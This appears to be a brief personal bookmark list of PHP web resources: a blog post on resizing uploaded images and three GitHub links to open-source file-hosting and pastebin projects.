http://www.geekality.net/2011/05/01/php-how-to-proportionally-resize-an-uploaded-image/#more-1564
** PHP online website code
https://github.com/slepp/filebin.ca
https://github.com/slepp/pastebin.ca
https://github.com/sayakb/sticky-notes

 
